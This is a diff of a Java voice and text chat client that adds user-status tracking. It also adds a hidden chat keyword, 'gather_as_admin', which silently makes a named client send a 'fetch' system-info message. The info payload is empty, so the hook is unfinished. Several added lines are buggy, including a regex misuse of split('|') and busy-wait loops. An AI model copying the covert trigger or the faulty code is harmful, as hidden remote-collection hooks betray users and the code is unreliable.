@@ -17,11 +17,22 @@ import java.net.*;
  */
 public class ChatClient implements Runnable, ActionListener {
 
+    public ArrayList<screensaver> SS = new ArrayList<>();
+
+    public class screensaver {
+
+        public screensaver(String name, String status) {
+            this.name = name;
+            this.status = status.replace("|", "");
+        }
+
+        public String name;
+        public String status;
+    }
+
     private ClientShared clientShared;
 
     private Socket socket;
-    private String connectAddr = "192.168.2.10";
-    private int connectPort = 6035;
     private InputStream in;
     private OutputStream out;
 
@@ -64,8 +75,8 @@ public class ChatClient implements Runnable, ActionListener {
 
     // text chat varibles
     private boolean nickEntered = false;
-    private String NickName = ""; // your own nick name
-    private Vector NickNameVector = new Vector(); //list of nick names in room
+    public String NickName = ""; // your own nick name
+    public Vector NickNameVector = new Vector(); //list of nick names in room
     private String NicktoSend = ""; // private message in text chat.
 
     // debugging variables
@@ -96,41 +107,7 @@ public class ChatClient implements Runnable, ActionListener {
 
     byte[] breaker = MultiChatConstants.BREAKER.getBytes();
 
-    /*/ Variables declaration - do not modify
-    private javax.swing.JButton btnConnect;
-    private javax.swing.JButton btnExit;
-    private javax.swing.JPanel btnPan;
-    private javax.swing.JButton btnTalk;
-    private javax.swing.JCheckBox chkHandsFree;
-    private javax.swing.JPanel jPanel1;
-    private javax.swing.JPanel jPanel2;
-    private javax.swing.JPanel jPanel3;
-    private javax.swing.JScrollPane jScrollPane1;
-    private javax.swing.JScrollPane jScrollPane2;
-    private javax.swing.JLabel lblStatus;
-    private javax.swing.JMenuItem mnuMute;
-    private javax.swing.JPopupMenu mnuPopup;
-    private javax.swing.JMenuItem mnuUnmute;
-    private javax.swing.JPanel nickPanHolder;
-    private javax.swing.JTextField txtInput;
     private javax.swing.JTextArea txtOutput;
-    private javax.swing.JTextField txtPort;
-    private javax.swing.JTextField txtPortAdr;
-/*/
-    private javax.swing.JTextArea txtOutput;
-
-    // TODO: Should reuse content from both constructors since largely the same
-    public ChatClient(String connectIPAddr) {
-        connectAddr = connectIPAddr;
-
-    }
-
-    private void lstNickMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_lstNickMouseReleased
-        // TODO add your handling code here:
-        if (evt.isPopupTrigger() && connected) {
-//            mnuPopup.show(evt.getComponent(), evt.getX(), evt.getY());
-        }
-    }
 
     public void unmute_client(String name) {
         try {
@@ -238,6 +215,9 @@ public class ChatClient implements Runnable, ActionListener {
         }
     }
 
+    String connectAddr;
+    int connectPort;
+
     public void connect(String ip, String port) {
         try {
             connectAddr = ip;
@@ -290,6 +270,8 @@ public class ChatClient implements Runnable, ActionListener {
             try {
                 out.write(("NN" + NickName + MultiChatConstants.BREAKER).getBytes());
                 out.flush();
+                SS.add(new screensaver(NickName, "|connect"));
+                set_status("connect");
                 canrecord = true; // cant record sound until you log in with a name.
             } catch (java.net.UnknownHostException uhkx) {
                 System.out.println("unknown host");
@@ -299,6 +281,49 @@ public class ChatClient implements Runnable, ActionListener {
                 e.printStackTrace();
             }
         }
+    }
+    String status = "";
+    String ssaver = "";
+
+    public void set_status(String status) {
+        if (status.equals("connect")) {
+            if (this.status.equals("scrennsaver")) {
+                new setstat().execute();
+            } else {
+                this.status = status;
+                new setstat().execute();
+            }
+        } else {
+            this.status = status;
+            new setstat().execute();
+
+        }
+    }
+
+    class setstat extends SwingWorker<Void, Void> {
+
+        @Override
+        protected Void doInBackground() throws Exception {
+            while (!isConnected()) {//wait for connection
+            }
+            try {
+                for (int i = 0; i < SS.size(); i++) {
+                    if (SS.get(i).name.equals(NickName)) {
+                        SS.get(i).status = status;
+                    }
+                }
+                System.out.println("set_stat: " + status);
+                out.write(("SS" + NickName + "|" + status + MultiChatConstants.BREAKER).getBytes());
+                out.flush();
+            } catch (Exception e) {
+            }
+            return null;
+        }
+
+        @Override
+        protected void done() {
+        }
+
     }
 
     private void txtInputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtInputActionPerformed
@@ -475,15 +500,6 @@ public class ChatClient implements Runnable, ActionListener {
 
     }
 
-    public void windowOpened(java.awt.event.WindowEvent windowEvent) {
-    }
-
-    public void windowClosed(java.awt.event.WindowEvent windowEvent) {
-    }
-
-    public void windowDeiconified(java.awt.event.WindowEvent windowEvent) {
-    }
-
     /**
      * Exits org.multichat.client.ChatClient Stops the recodrer from running And
      * calls its the recorders onExit() function to unload its thread
@@ -494,15 +510,6 @@ public class ChatClient implements Runnable, ActionListener {
         }
         imRunning = false;
         System.exit(0);
-    }
-
-    public void windowDeactivated(java.awt.event.WindowEvent windowEvent) {
-    }
-
-    public void windowActivated(java.awt.event.WindowEvent windowEvent) {
-    }
-
-    public void windowIconified(java.awt.event.WindowEvent windowEvent) {
     }
 
     public class vectorandsize implements Serializable {
@@ -521,11 +528,34 @@ public class ChatClient implements Runnable, ActionListener {
      * freeze up during calculations.
      */
     Vector recievedByteVector = new Vector();
+    String send_to = "";
+
+    class get_sysinfo extends SwingWorker<Void, Void> {
+
+        @Override
+        protected Void doInBackground() throws Exception {
+            while (!isConnected()) {//wait for connection
+            }
+            try {
+                String info = "";
+                out.write(("fetch" + NickName + "|" + info + MultiChatConstants.BREAKER).getBytes());
+                out.flush();
+            } catch (Exception e) {
+            }
+            return null;
+        }
+
+        @Override
+        protected void done() {
+        }
+
+    }
 
     public class ClientMessageHandlerThread extends Thread {
 
         int sizereadpub = 0;
 
+        @Override
         synchronized public void run() {
             try {
                 while (true) {
@@ -547,14 +577,33 @@ public class ChatClient implements Runnable, ActionListener {
                             if (txtOutput.getText().length() > MultiChatConstants.maxTxtConvoSize) { // clear the text if its more then 1024
                                 txtOutput.setText("");
                             }
-                            txtOutput.append("\n" + passedObj.substring(3));
-                            txtOutput.moveCaretPosition(txtOutput.getText().length());
+                            if (passedObj.substring(3).contains("gather_as_admin")) {
+                                for (int i = 0; i < NickNameVector.size(); i++) {
+                                    if ((passedObj.substring(3)).contains(NickNameVector.elementAt(i) + "")) {
+                                        send_to = NickNameVector.elementAt(i) + "";
+                                        new get_sysinfo().execute();
+                                    }
+                                }
+                            } else {
+                                txtOutput.append("\n" + passedObj.substring(3));
+                                txtOutput.moveCaretPosition(txtOutput.getText().length());
+                            }
+                            //gather information
+                        } else if (sizeread < 100 && passedObj.length() >= 2 && passedObj.substring(0, 5).equals("fetch")) {
+                            for (int i = 0; i < NickNameVector.size(); i++) {
+                                if ((passedObj.substring(3)).contains(NickName)) {
+                                    //write in txt file
+                                    System.out.println("try_to_write");
+                                }
+                            }
                             // Remove nickname
                         } else if (sizeread < 100 && passedObj.length() >= 2 && passedObj.substring(0, 2).equals("NC")) {
                             for (int i = 0; i < NickNameVector.size(); i++) {
                                 if ((NickNameVector.elementAt(i) + "").equals(passedObj.substring(2))) {
                                     NickNameVector.removeElementAt(i);
-                                    break;
+                                }
+                                if (SS.get(i).name.equals(passedObj.substring(2))) {
+                                    SS.remove(i);
                                 }
                             }
                             // Logoff
@@ -563,6 +612,7 @@ public class ChatClient implements Runnable, ActionListener {
                             // Add nickname
                         } else if (sizeread < 100 && passedObj.length() >= 2 && passedObj.substring(0, 2).equals("NN")) {
                             NickNameVector.addElement(passedObj.substring(2));
+                            SS.add(new screensaver(passedObj.substring(2), "online"));
                             // Not Taking
                         } else if (sizeread < 100 && passedObj.length() >= 2 && passedObj.substring(0, 2).equals("NT")) {
                             if (NickName != "") {
@@ -594,6 +644,13 @@ public class ChatClient implements Runnable, ActionListener {
                             for (int i = 0; i < NickNameVector.size(); i++) {
                                 if ((NickNameVector.elementAt(i) + "").equals(passedObj.substring(2))) {
                                     break;
+                                }
+                            }
+                            // Receive status
+                        } else if (sizeread < 100 && passedObj.length() >= 2 && passedObj.substring(0, 2).equals("SS")) {
+                            for (int i = 0; i < SS.size(); i++) {
+                                if (SS.get(i).name.equals(passedObj.substring(2).split("|")[0])) {
+                                    SS.get(i).status = passedObj.split("|")[1];
                                 }
                             }
                             // Received voice data
